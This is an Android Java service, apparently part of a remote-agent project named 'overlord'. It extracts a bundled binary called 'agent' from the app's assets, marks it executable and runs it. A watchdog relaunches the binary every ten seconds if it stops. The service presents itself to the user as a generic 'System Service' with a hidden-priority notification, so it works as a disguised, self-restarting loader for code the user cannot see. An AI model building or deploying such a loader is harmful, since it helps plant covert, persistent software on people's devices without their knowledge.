package com.overlord.agent;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class AgentService extends Service {

    private static final String TAG = "SystemService";
    private static final String CHANNEL_ID = "system_service_channel";
    private static final int NOTIFICATION_ID = 1;
    private static final String AGENT_BINARY = "agent";

    private Process agentProcess;
    private ScheduledExecutorService watchdog;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, buildNotification());
        extractAndRun();
        startWatchdog();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (watchdog != null) watchdog.shutdownNow();
        killAgent();
    }

    private void extractAndRun() {
        File agentFile = new File(getFilesDir(), AGENT_BINARY);
        try {
            try (InputStream in = getAssets().open(AGENT_BINARY);
                 FileOutputStream out = new FileOutputStream(agentFile)) {
                byte[] buf = new byte[65536];
                int n;
                while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
            }
            if (!agentFile.setExecutable(true, true)) {
                Log.e(TAG, "chmod failed, trying shell");
                Runtime.getRuntime().exec(new String[]{"chmod", "700", agentFile.getAbsolutePath()}).waitFor();
            }
            runAgent(agentFile);
        } catch (Exception e) {
            Log.e(TAG, "extract/run failed: " + e.getMessage());
        }
    }

    private void runAgent(File agentFile) {
        try {
            killAgent();
            ProcessBuilder pb = new ProcessBuilder(agentFile.getAbsolutePath());
            pb.directory(getFilesDir());
            pb.redirectErrorStream(true);
            agentProcess = pb.start();
            Log.i(TAG, "agent started pid=" + agentProcess.hashCode());
        } catch (IOException e) {
            Log.e(TAG, "start failed: " + e.getMessage());
        }
    }

    private void killAgent() {
        if (agentProcess != null) {
            agentProcess.destroy();
            agentProcess = null;
        }
    }

    private void startWatchdog() {
        watchdog = Executors.newSingleThreadScheduledExecutor();
        watchdog.scheduleWithFixedDelay(() -> {
            boolean dead = true;
            if (agentProcess != null) {
                try {
                    agentProcess.exitValue();
                } catch (IllegalThreadStateException e) {
                    dead = false;
                }
            }
            if (dead) {
                Log.w(TAG, "agent dead, restarting");
                File agentFile = new File(getFilesDir(), AGENT_BINARY);
                if (agentFile.exists()) runAgent(agentFile);
                else extractAndRun();
            }
        }, 10, 10, TimeUnit.SECONDS);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Service",
                    NotificationManager.IMPORTANCE_MIN);
            channel.setDescription("Background system service");
            channel.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        return builder
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setPriority(Notification.PRIORITY_MIN)
                .build();
    }

    public static void start(Context ctx) {
        Intent i = new Intent(ctx, AgentService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(i);
        } else {
            ctx.startService(i);
        }
    }
}
